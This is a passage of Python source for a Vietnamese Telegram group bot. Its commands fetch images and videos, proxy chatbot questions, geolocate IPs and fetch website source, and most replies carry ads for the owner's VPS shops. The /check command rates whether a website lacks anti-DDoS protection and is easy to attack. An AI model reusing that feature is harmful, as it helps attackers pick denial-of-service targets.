        bot.reply_to(message, f"❌ Đã xảy ra lỗi: {e}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.clic\nShop 4G 💳💲: https://4gvpsvanmanhgaming.click")







@bot.message_handler(commands=['anhgaianime'])
def anhh_gai(message):
    user_id = message.from_user.id
    username = message.from_user.username

    if not is_bot_active:
        bot.reply_to(message, '🚫 Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type not in ["group", "supergroup"]:
        bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return

    # Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, '🚫 **Trộm bot à?** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return

    try:
        response = requests.get('https://api.sumiproject.net/images/anime')
        
        if response.status_code == 200:
            data = response.json()
            if 'url' in data:
                image_url = data['url']
                if username:
                    user_mention = f"@{username}"
                else:
                    user_mention = f"<a href='tg://user?id={user_id}'></a>"

                bot.send_message(message.chat.id, f"@{username} đã yêu cầu ảnh:", parse_mode='HTML')
                bot.send_photo(message.chat.id, image_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚟, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚘 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• 𝙾𝚠𝚗𝚎𝚛: @Vpsvanmanhgaming\n•VPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\n•Shop 4G 💳💲: https://4gvpsvanmanhgaming.click\n• Ảnh dành cho @{username}", parse_mode='HTML')
            else:
                bot.reply_to(message, "❌ Không tìm thấy URL ảnh trong phản hồi từ API.")
        else:
            bot.reply_to(message, f"❌ Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G 💳💲: 'https://4gvpsvanmanhgaming.click")
    except requests.exceptions.RequestException as req_err:
        bot.reply_to(message, f"❌ Lỗi khi gửi yêu cầu: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: 'https://httpsvpsvanmanhgaming.click\nShop 4G 💳💲: https://4gvpsvanmanhgaming.click")
    except Exception as e:
        bot.reply_to(message, f"❌ Đã xảy ra lỗi: {e}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.clic\nShop 4G 💳💲: https://4gvpsvanmanhgaming.click")




@bot.message_handler(commands=['vdgai'])
def vdgai(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    try:
        response = requests.get('https://api.sumiproject.net/video/videogai')
        
        if response.status_code == 200:
            data = response.json()
            if 'url' in data:
                video_url = data['url']
                user_id = message.from_user.id
                username = message.from_user.username
                if username:
                    user_mention = f"@{username}"
                else:
                    user_mention = f"<a href='tg://user?id={user_id}'>người dùng</a>"

                bot.send_message(message.chat.id, f"{user_mention} đã yêu cầu video:\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
                bot.send_video(message.chat.id, video_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• 𝙾𝚠𝚗𝚎𝚛: @Vpsvanmanhgaming\n•VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n•Video dành cho {user_mention}")
            else:
                bot.reply_to(message, "Không tìm thấy URL video trong phản hồi từ API")
        else:
            bot.reply_to(message, f"Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}")
    except requests.exceptions.RequestException as req_err:
        bot.reply_to(message, f"Lỗi khi gửi yêu cầu: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
    except Exception as e:
        bot.reply_to(message, f"Đã xảy ra lỗi: {e}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")





@bot.message_handler(commands=['vdgaianime'])
def vdgai(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    try:
        response = requests.get('https://api.sumiproject.net/video/videoanime')
        
        if response.status_code == 200:
            data = response.json()
            if 'url' in data:
                video_url = data['url']
                user_id = message.from_user.id
                username = message.from_user.username
                if username:
                    user_mention = f"@{username}"
                else:
                    user_mention = f"<a href='tg://user?id={user_id}'>người dùng</a>\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n"

                bot.send_message(message.chat.id, f"{user_mention} đã yêu cầu video:\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
                bot.send_video(message.chat.id, video_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• 𝙾𝚠𝚗𝚎𝚛: @Vpsvanmanhgaming\n•VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n•Video dành cho {user_mention}")
            else:
                bot.reply_to(message, "Không tìm thấy URL video trong phản hồi từ API\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
        else:
            bot.reply_to(message, f"Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
    except requests.exceptions.RequestException as req_err:
        bot.reply_to(message, f"Lỗi khi gửi yêu cầu: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
    except Exception as e:
        bot.reply_to(message, f"Đã xảy ra lỗi: {e}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")




@bot.message_handler(commands=['ask'])
def gpt4_query(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type not in ["group", "supergroup"]:
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    try:
        # Tách lệnh và câu hỏi từ tin nhắn
        command, query = message.text.split(' ', 1)
    except ValueError:
        bot.reply_to(message, "Vui lòng cung cấp câu hỏi hợp lệ. Ví dụ: /ask Câu hỏi của bạn")
        return

    # URL của API
    api_url = f'https://api.sumiproject.net/bard?ask={query}'

    try:
        response = requests.get(api_url)
        response.raise_for_status()  # Ném lỗi nếu có lỗi HTTP (khác 200)

        response_data = response.json()

        # Kiểm tra xem phản hồi có dữ liệu hợp lệ không
        if 'data' in response_data:
            data = response_data['data']
            bot.reply_to(message, f'🤖 Phản hồi của GPT-4:\n{data}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
        else:
            bot.reply_to(message, 'Không có dữ liệu phản hồi từ API.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
        # Lưu dữ liệu thô vào log
        logging.info(f"Response data for query '{query}': {response_data}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")

    except requests.HTTPError as http_err:
        logging.error(f'HTTP error occurred: {http_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
        bot.reply_to(message, f'Có lỗi HTTP khi gọi API: {http_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
    except requests.RequestException as req_err:
        logging.error(f'Request error occurred: {req_err}')
        bot.reply_to(message, f'Có lỗi khi yêu cầu API: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
    except Exception as err:
        logging.error(f'Unexpected error occurred: {err}')
        bot.reply_to(message, f'Có lỗi không xác định: {err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')

# Xóa webhook trước khi bắt đầu polling
bot.delete_webhook()


@bot.message_handler(commands=['gemini'])
def ask(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Lấy thông tin người dùng từ message
    user = message.from_user
    user_mention = user.first_name
    user_link = f'<a href="tg://user?id={user.id}">{user_mention} </a>'
    chat_id = message.chat.id
    user_id = user.id
    username = user.username if user.username else "Không có username"
    full_name = user.full_name if user.full_name else "No Name"
    
    # Ghi lại thời gian khi nhận lệnh
    start_time = time.time()
    start_time_formatted = datetime.datetime.fromtimestamp(start_time).strftime('%H:%M:%S')
    
    user_input = message.text.replace('/gemini', '').strip()
    if not user_input:
        bot.reply_to(message, 'Vui lòng nhập một văn bản sau lệnh /gemini.')
        return
    
    api_url = f'http://hlam-api.x10.mx/gemini.php?text={user_input}'
    try:
        response = requests.get(api_url)
        response.raise_for_status()  # Kiểm tra mã trạng thái HTTP
        
        try:
            result = response.json()  # Giải mã phản hồi JSON
            message_text = result.get('text', 'Connect @pautous Và @Vpsvanmanhgaming')
        except ValueError:
            message_text = 'Lỗi xử lý phản hồi API: Không thể giải mã JSON.'
        
        # Tính thời gian trôi qua
        elapsed_time = time.time() - start_time
        elapsed_minutes = int(elapsed_time // 60)
        elapsed_seconds = int(elapsed_time % 60)
        elapsed_time_str = f'{elapsed_minutes}m {elapsed_seconds}s'
        hi = f'''
🤖 Gemini :<b>{message_text}</b>
✧══════ ༺༻ •══════✧
🟢<b><i>Time</i></b> : {start_time_formatted}
⏱<b><i>Response Time</i></b> : {elapsed_time_str}
👤<b><i>User By:</i></b> : {user_link}
<b><i>VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click</i></b>
<b><i>Shop 4G💳💲:https://4gvpsvanmanhgaming.click</i></b>
✧══════ ༺༻ •══════✧
'''
        bot.send_message(chat_id=chat_id, text=hi, parse_mode="html")
    
    except requests.RequestException as e:
        bot.send_message(chat_id=chat_id, text=f'Có lỗi xảy ra khi gọi API: {str(e)}')



@bot.message_handler(commands=['crush'])
def check_freefire_account(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return


    # URL của API
    api_url = 'https://api.sumiproject.net/text/thinh'

    try:
        # Gửi yêu cầu GET đến API
        response = requests.get(api_url)
        response.raise_for_status()  # Ném lỗi nếu có lỗi HTTP (khác 200)

        # Lấy dữ liệu phản hồi dưới dạng JSON
        response_data = response.json()

        # Kiểm tra xem phản hồi có 'data' không
        if 'data' in response_data:
            data = response_data['data']
            bot.reply_to(message, f'🌸 {data}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
        else:
            bot.reply_to(message, 'Không có dữ liệu phản hồi từ API.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')

    except requests.HTTPError as http_err:
        bot.reply_to(message, f'Có lỗi HTTP khi gọi API: {http_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')

    except requests.RequestException as req_err:
        bot.reply_to(message, f'Có lỗi khi yêu cầu API: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')

    except Exception as err:
        bot.reply_to(message, f'Có lỗi không xác định: {err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')





@bot.message_handler(commands=['cpu'])
def check_cpu(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
    
    user_id = message.from_user.id
    if user_id not in ADMIN_ID:
        if user_id not in ADMIN_AD:   
            bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này. \n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
            return

    # Tiếp tục xử lý lệnh cpu ở đây
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%\n'
'━━━━━━━━━━━━━━━━━━━\nhttps://files.catbox.moe/92yrkf.mp4\n━━━━━━━━━━━━━━━━━━━')




ADMIN_UID = {6244038301}  # Sử dụng set để chứa user_id của admin

is_bot_active = True

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_UID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này!')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot đã được tắt. Tất cả người dùng không thể sử dụng lệnh khác!')



@bot.message_handler(commands=['khoidonglai'])
def handle_start(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_UID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này!')
        return
    
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    if message.chat.type not in ["group", "supergroup"]:
        bot.reply_to(message, 'Xin lỗi, tôi chỉ hoạt động trong nhóm.')
        return

    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Xin lỗi, tôi chỉ hoạt động trong nhóm được cho phép.')
        return

    bot.send_message(message.chat.id, "Bot đã được khởi động lại!")




@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_UID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này!')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')






API_URL = 'https://api.sumiproject.net/checkip?ip='

@bot.message_handler(commands=['checkip'])
def infoip(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
    
    # Trích xuất nội dung từ tin nhắn
    text = message.text.strip().split(' ')
    if len(text) < 2:
        bot.reply_to(message, 'Bạn Vui Lòng Nhập checkip < IP Muốn Check >.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
        return

    ip_address = text[1]
    api_endpoint = API_URL + ip_address

    try:
        # Gửi yêu cầu đến API
        response = requests.get(api_endpoint)
        if response.status_code == 200:
            data = response.json()

            # Chuẩn bị tin nhắn phản hồi
            info_message = (
                f"<b>Thông tin địa chỉ IP:</b>\n"
                f"<b>IP:</b> {data.get('ip', 'N/A')}\n"
                f"<b>Tên Máy Chủ:</b> {data.get('hostname', 'N/A')}\n"
                f"<b>Thành Phố:</b> {data.get('city', 'N/A')}\n"
                f"<b>Vùng:</b> {data.get('region', 'N/A')}\n"
                f"<b>Quốc Gia:</b> {data.get('country', 'N/A')}\n"
                f"<b>ISP:</b> {data.get('isp', 'N/A')}\n"
            )

            # Trả lời tin nhắn với định dạng HTML
            bot.reply_to(message, info_message, parse_mode='HTML')

        else:
            bot.reply_to(message, f"Không thể lấy dữ liệu từ server. Mã lỗi: {response.status_code}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")

    except Exception as e:
        print(str(e))
        bot.reply_to(message, 'Đã xảy ra lỗi trong quá trình xử lý yêu cầu.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')




@bot.message_handler(commands=['check'])
def check_ip(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
    try:
        if len(message.text.split()) != 2:
            bot.reply_to(message, '>> Vui lòng nhập đúng cú pháp !\nVí dụ: /check + [link website]\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
            return

        url = message.text.split()[1]
        
        # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
        if not url.startswith(("http://", "https://")):
            url = "http://" + url

        # Loại bỏ tiền tố "www" nếu có
        url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
        
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Ip của website: {url}\nLà: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website có 1 ip có khả năng không Antiddos🔒\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click"
        else:
            reply += "Website có nhiều hơn 1 ip khả năng Antiddos🔒 Cao.\nKhó Có Thể Tấn Công Website này.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click"

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")




# Danh sách các URL bị chặn
blocked_weps = ["Httpsvpsvanmanhgaming.click", "4gvpsvanmanhgaming.click", "4Gvpsvanmanhgaming.click", "4gvpsvanmanhgaming.CLICK", "4gvpsvanmanhgaming.cLick", "4GVpsvanmanhgaming.Click", "4GVPSVANMANHGAMING.cick", "4GVPSVANMANHGAMING.Click", "4GVPSVANMANHGAMING.CLICK", "https://4gvpsvanmanhgaming.click", "HTTPS://4gvpsvanmanhgaming.click", "httpsvpsvanmanhgaming.click", "HTTPSVPSVANMANHGAMING.click", "HTTPSVPSVANMANHGAMING.CLICK", "https://httpsvpsvanmanhgaming.click", "Httpsvpsvanmanhgaming.click", "HTTPS://VPSVANMANHGAMING.CLICK", " Httpsvpsvanmanhgaming.click", "https://pandanetwork.click", "pandanetwork.click", "Https://Pandanetwork.click", "Pandanetwork.click", "https://api.sumiproject.net", 'api.sumiproject.net', "Https://api.sumiproject.net", 'Https://Api.sumiproject.net']
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    user_username = message.from_user.username if message.from_user.username else message.from_user.first_name
    
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type not in ["group", "supergroup"]:
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Kiểm tra cú pháp của lệnh
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /code + [link website]')
        return

    url = message.text.split()[1]

    # Kiểm tra và thêm giao thức nếu cần
    parsed_url = urlparse(url)
    if not parsed_url.scheme:
        url = "http://" + url
        parsed_url = urlparse(url)

    # Kiểm tra tính hợp lệ của URL
    if not parsed_url.scheme or not parsed_url.netloc:
        bot.reply_to(message, f"URL không hợp lệ: {url}. Vui lòng kiểm tra lại.!\n@{user_username}\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
        return

    # Kiểm tra URL có nằm trong danh sách bị chặn không
    if any(blocked_wep in url.lower() for blocked_wep in blocked_weps):
        bot.reply_to(message, f"Không được phép lấy code web này: {url}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click")
        return

    try:
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
